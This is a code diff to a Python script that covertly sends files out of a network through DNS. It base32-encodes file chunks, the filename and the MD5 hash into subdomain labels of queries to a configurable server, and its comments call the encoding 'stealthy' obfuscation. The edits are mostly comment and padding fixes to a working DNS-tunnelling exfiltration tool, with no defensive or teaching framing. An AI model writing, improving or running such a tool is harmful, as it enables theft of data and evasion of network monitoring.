@@ -3,11 +3,11 @@ import base64
 import hashlib
 import os
 
-DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server
+DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server IP
 DNS_PORT = 53
 domain = "fileupload.example.com"  # Domain to use
 
-# Function to calculate MD5 hash
+# Function to calculate MD5 hash of a file
 def calculate_md5(file_path):
     md5_hash = hashlib.md5()
     with open(file_path, "rb") as f:
@@ -15,11 +15,17 @@ def calculate_md5(file_path):
             md5_hash.update(byte_block)
     return md5_hash.hexdigest()
 
-# Function to make strings stealthy (base32 encoding)
+# Function to ensure base32 strings are properly padded
+def add_padding(base32_str):
+    """Ensures that base32 strings have the correct padding."""
+    missing_padding = len(base32_str) % 8
+    if missing_padding != 0:
+        return base32_str + '=' * (8 - missing_padding)
+    return base32_str
+
+# Function to make strings stealthy using base32 encoding
 def obfuscate_data(data):
-    # Ensure the data is padded correctly for base32
-    padded_data = data + '=' * (-len(data) % 8)  # Add padding to ensure length is a multiple of 8
-    return base64.b32encode(padded_data.encode()).decode()
+    return base64.b32encode(data.encode()).decode().strip("=")
 
 # Function to send a DNS query
 def send_dns_query(data, server_ip):
@@ -35,18 +41,18 @@ def send_file_chunks(file_path, server_ip, domain):
     with open(file_path, "rb") as file:
         for chunk_number in range(total_chunks):
             chunk_data = file.read(chunk_size)
-            encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")  # Strip padding for chunk
+            encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")
 
             # Send the chunk with an obfuscated identifier
             query = f"{encoded_chunk_data}.{obfuscate_data('chunk')}.{chunk_number}.{domain}"
             print(f"Sending chunk {chunk_number}")
             send_dns_query(query, server_ip)
 
-# Function to send file information
+# Function to send file information (filename and MD5 hash)
 def send_file_info(file_name, file_md5, server_ip, domain):
     # Obfuscate the file name and MD5 hash
-    encoded_file_name = base64.b32encode(file_name.encode()).decode()
-    encoded_file_md5 = base64.b32encode(file_md5.encode()).decode()
+    encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
+    encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")
 
     # Send the obfuscated file info as a DNS query
     query = f"{encoded_file_name}.{encoded_file_md5}.{obfuscate_data('fileinfo')}.{domain}"
@@ -64,7 +70,7 @@ def send_file(file_path):
     file_name = os.path.basename(file_path)
     file_md5 = calculate_md5(file_path)
 
-    # Send file info
+    # Send file info (filename and MD5 hash)
     send_file_info(file_name, file_md5, DNS_SERVER, domain)
 
     # Send file chunks
